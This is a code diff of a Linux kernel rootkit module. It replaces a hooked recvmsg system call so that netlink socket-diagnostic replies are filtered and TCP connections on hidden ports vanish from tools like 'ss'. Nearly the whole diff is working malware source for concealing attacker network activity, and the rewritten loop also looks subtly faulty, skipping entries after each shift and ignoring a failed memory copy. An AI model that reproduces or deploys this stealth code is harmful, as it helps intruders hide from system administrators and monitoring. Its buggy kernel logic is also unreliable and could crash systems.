@@ -47,61 +47,63 @@ static int port_in_list(unsigned int port, unsigned int list[], int count){
 	return 0;
 } 
 
-static long my_sys_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags){
-  // Call the original function
-  long ret = orig_sys_recvmsg(fd, umsg, flags);
+static long my_sys_recvmsg(int fd, struct msghdr __user *msg, unsigned flags){
+	long lres, msglen;
+	struct socket * socket;
+	struct sock * sk;
+	struct msghdr * mmsg;
+	struct nlmsghdr * nlh, *nxt; //netlink message header struct
+	struct inet_diag_msg * diag_msg; 
+	int error = 0;
+	
+	rcount++;	
+	
+	lres =  orig_sys_recvmsg(fd, msg, flags);
+	
+	if(lres == 0) goto out;	
 
-  // Check if the file is really a socket and get it
-  int err = 0;
-  struct socket* s = sockfd_lookup(fd, &err);
-  struct sock* sk = s->sk;
+	if(is_hidden == 0) goto out;	
+	
+	socket = sockfd_lookup(fd, &error);
+	if(!error && socket == NULL){
+		goto out;
+	}
+	sk = socket->sk;
 
-  // Check if the socket is used for the inet_diag protocol
-  if (!err && sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG) {
-
-    // Check if it is a process called "ss" (optional ;))
-    /*if (strcmp(current->comm, "ss") == 0) {*/
-    long remain = ret;
-
-      // Copy data from user space to kernel space
-    struct msghdr* msg = kmalloc(ret, GFP_KERNEL);
-    int err = copy_from_user(msg, umsg, ret);
-    struct nlmsghdr* hdr = msg->msg_iov->iov_base;
-    if (err) {
-      return ret; // panic
-    }
-
-    // Iterate the entries
-    do {
-      struct inet_diag_msg* r = NLMSG_DATA(hdr);
-
-      // We only have to consider TCP ports here because ss fetches
-      // UDP information from /proc/udp which we already handle
-      if (in_tcplist(r->id.idiag_sport) || in_tcplist(r->id.idiag_dport)) {
-        // Hide the entry by coping the remaining entries over it
-        long new_remain = remain;
-        struct nlmsghdr* next_entry = NLMSG_NEXT(hdr, new_remain);
-        memmove(hdr, next_entry, new_remain);
-
-        // Adjust the length variables
-        ret -= (remain - new_remain);
-        remain = new_remain;
-      } else {
-        // Nothing to do -> skip this entry
-        hdr = NLMSG_NEXT(hdr, remain);
-      }
-    } while (remain > 0);
-
-    // Copy data back to user space
-    err = copy_to_user(umsg, msg, ret);
-    kfree(msg);
-    if (err) {
-      return ret; // panic
-    }
-  /*}*/
-  }
-  return ret;
-
+	
+	//check if family (important) and protocol match (otherwise the cast might fail at some point?)
+	if(sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG){ //that's a bingo!
+		mmsg = (struct msghdr * ) kmalloc(lres, GFP_KERNEL);
+		error = copy_from_user(mmsg, msg, lres);
+		
+		msglen = lres;
+		
+		//if(error > 0) return lres; //copy from user failed, can't access memory
+		
+		nlh = (struct nlmsghdr *) mmsg->msg_iov->iov_base;
+	
+		printk(KERN_INFO "is that how you say it? No. It's just 'Bingo!'\n");		
+		
+		do{
+			diag_msg = NLMSG_DATA(nlh);
+			if(in_tcplist(diag_msg->id.idiag_sport) || in_tcplist(diag_msg->id.idiag_dport)){
+				printk(KERN_INFO "Bingo! src: %d dest: %d\n", diag_msg->id.idiag_sport,
+										diag_msg->id.idiag_dport);
+			
+				lres -= NLMSG_ALIGN((nlh)->nlmsg_len);
+				nxt = NLMSG_NEXT(nlh, msglen);
+				memmove(nlh, nxt, msglen); //shift entries
+			}
+			nlh = NLMSG_NEXT(nlh, msglen);
+			printk(KERN_INFO " %ld\n", msglen);
+			}while(NLMSG_OK(nlh, msglen));
+		
+		//save return value to suppress warning
+		error = copy_to_user(msg, mmsg, lres);
+		kfree(mmsg); 
+	}
+out:	printk(KERN_INFO "returning %d\n", --rcount);		
+	return lres;
 }
 
 static int my_tcp_seq_show(struct seq_file * m, void * v){
